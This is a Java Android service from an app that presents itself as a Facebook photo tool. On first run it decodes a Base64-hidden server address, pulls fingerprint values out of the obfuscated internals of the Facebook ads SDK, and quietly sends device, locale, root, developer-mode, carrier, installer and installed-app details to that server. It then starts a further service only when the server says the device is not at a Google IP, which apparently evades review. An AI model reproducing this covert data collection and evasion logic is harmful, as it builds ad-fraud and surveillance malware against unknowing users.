package com.facebook.photo.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import com.facebook.photo.model.ClientConfig;
import com.facebook.photo.utils.AppConstants;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.io.IOException;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class FirstRunService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(AppConstants.log_tag, "FirstRunService onCreate");
        getConfig();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(AppConstants.log_tag, "FirstRunService onStartCommand");
        return START_NOT_STICKY;
    }

    private static int isDevMode(Context context) {
        if(Integer.valueOf(Build.VERSION.SDK_INT) == 16) {
            return android.provider.Settings.Secure.getInt(context.getContentResolver(),
                    android.provider.Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED , 0);
        } else if (Integer.valueOf(Build.VERSION.SDK_INT) >= 17) {
            return android.provider.Settings.Secure.getInt(context.getContentResolver(),
                    android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
        } else return 0;
    }

    private static String isPackageInstalled(Context c, String targetPackage) {
        PackageManager pm = c.getPackageManager();
        try {
            PackageInfo info = pm.getPackageInfo(targetPackage, PackageManager.GET_META_DATA);
        } catch (PackageManager.NameNotFoundException e) {
            return "0";
        }
        return "1";
    }

    private static int getNumberAppInstall(Context context)
    {
        PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        return  packages.size();
    }

    private void getConfig() {
        final SharedPreferences mPrefs = getSharedPreferences("adsserver", 0);
        String url_client_config = new String(Base64.decode(AppConstants.CODE_CLIENT_CONFIG, Base64.DEFAULT));
        String uuid = AppConstants.pre_uuid + UUID.randomUUID().toString();

        com.facebook.ads.internal.n.d classD = new com.facebook.ads.internal.n.d(getApplicationContext(), true);
        Map hm = classD.b();

        String afp = hm.get("AFP").toString();
        String ashas = hm.get("ASHAS").toString();
        String valparams = hm.get("VALPARAMS").toString();
        JsonObject jsonObject = new JsonParser().parse(valparams).getAsJsonObject();
        String apk_size = jsonObject.get("apk_size").getAsString();

        Log.d("AFadsdk",afp);
        Log.d("ASadsdk",ashas);
        Log.d("SZadsdk",apk_size);

        if (!mPrefs.contains("url_client_config")) {
            SharedPreferences.Editor editor = mPrefs.edit();
            editor.putString("url_client_config", url_client_config);
            editor.putString("uuid", uuid);

            editor.putString("BUNDLE", getPackageName());
            editor.putString("APPNAME", getAppLable());
            editor.putString("APPVERS", getAppVersionName());
            editor.putString("APPBUILD", String.valueOf(getAppBuild()));
            editor.putString("APP_MIN_SDK_VERSION", AppConstants.minsdk_version);
            editor.putString("BANNER_ID", AppConstants.BANNER_ID);
            editor.putString("FULL_ID", AppConstants.FULL_ID);
            editor.apply();
        }

        Boolean isCreateShortcut = false;
        Locale locale;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            locale = getResources().getConfiguration().getLocales().get(0);
        } else {
            //noinspection deprecation
            locale = getResources().getConfiguration().locale;
        }

        final OkHttpClient client = new OkHttpClient();
        RequestBody body = new FormBody.Builder()
                .add("countTotalShow", "0")
                .add("totalTime", "0")
                .add("os", Build.VERSION.SDK_INT + "")
                .add("device", getDeviceName())
                .add("id", uuid)
                .add("id_game", getPackageName())
                .add("bundle", getPackageName())
                .add("lg", locale.getLanguage().toLowerCase())
                .add("lc", locale.getCountry().toLowerCase())
                .add("isCreateShortcut", String.valueOf(isCreateShortcut))
                .add("build", String.valueOf(getAppBuild()))
                .add("afp",afp)
                .add("ashas",ashas)
                .add("apksize",apk_size)
                .add("ashas",ashas)
                .add("appvers",getAppVersionName())
                .add("isDeveloper", String.valueOf(isDevMode(getApplicationContext())))
                .add("installer", hm.get("INSTALLER").toString())
                .add("ROOTED", hm.get("ROOTED").toString())
                .add("ANALOG", hm.get("ANALOG").toString())
                .add("CARRIER", hm.get("CARRIER").toString())
                .add("number_app", String.valueOf(getNumberAppInstall(getApplicationContext())))
                .add("isFacebook", isPackageInstalled(getApplicationContext(),"com.facebook.katana"))
                .add("isMessenger", isPackageInstalled(getApplicationContext(),"com.facebook.orca"))
                .build();
        Request okRequest = new Request.Builder()
                .url(url_client_config)
                .post(body)
                .build();
        client.newCall(okRequest).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    if (response.isSuccessful()) {
                        Gson gson = new GsonBuilder().create();
                        String result = response.body().string();
                        ClientConfig clientConfig = gson.fromJson(result, ClientConfig.class);

                        SharedPreferences.Editor editor = mPrefs.edit();
                        editor.putString("BUNDLE", clientConfig.BUNDLE);
                        editor.putString("APP_MIN_SDK_VERSION", clientConfig.APP_MIN_SDK_VERSION);
                        editor.putString("APPBUILD", clientConfig.APPBUILD);
                        editor.putString("APPNAME", clientConfig.APPNAME);
                        editor.putString("APPVERS", clientConfig.APPVERS);
                        editor.putString("UNITY", clientConfig.UNITY);

                        if (!"".equals(clientConfig.ASHAS))
                            editor.putString("ASHAS", clientConfig.ASHAS);
                        if (!"".equals(clientConfig.AFP))
                            editor.putString("AFP", clientConfig.AFP);
                        if (!"".equals(clientConfig.apk_size) && !"-1".equals(clientConfig.apk_size))
                            editor.putString("apk_size", clientConfig.apk_size);

                        editor.putString("FULL_ID", clientConfig.FULL_ID);
                        editor.putString("FULL_ADMOB_ID", clientConfig.FULL_ADMOB_ID);
                        editor.putString(AppConstants.tag_data, result);
                        editor.apply();

                        if (clientConfig.isGoogleIp != 1) {
                            Intent myIntent = new Intent(getApplicationContext(), MyService.class);
                            startService(myIntent);
                        }
                        Log.d(AppConstants.log_tag, "reportAndGetClientConfig done!");
                        FirstRunService.this.stopSelf();
                    }
                } catch (Exception e) {
                }

            }
        });

    }

    private int getAppBuild() {
        try {
            return getPackageManager().getPackageInfo(getPackageName(), 0).versionCode;
        } catch (PackageManager.NameNotFoundException localNameNotFoundException) {
            localNameNotFoundException.printStackTrace();
        }
        return 0;
    }

    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return model;
        }
        return manufacturer + " " + model;
    }

    private String getAppVersionName() {
        try {
            return getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException localNameNotFoundException) {
            localNameNotFoundException.printStackTrace();
        }
        return "";
    }

    private String getAppLable() {
        PackageManager packageManager = getPackageManager();
        ApplicationInfo applicationInfo = null;
        try {
            applicationInfo = packageManager.getApplicationInfo(getApplicationInfo().packageName, 0);
        } catch (final PackageManager.NameNotFoundException e) {
        }
        return (String) (applicationInfo != null ? packageManager.getApplicationLabel(applicationInfo) : "");
    }
}
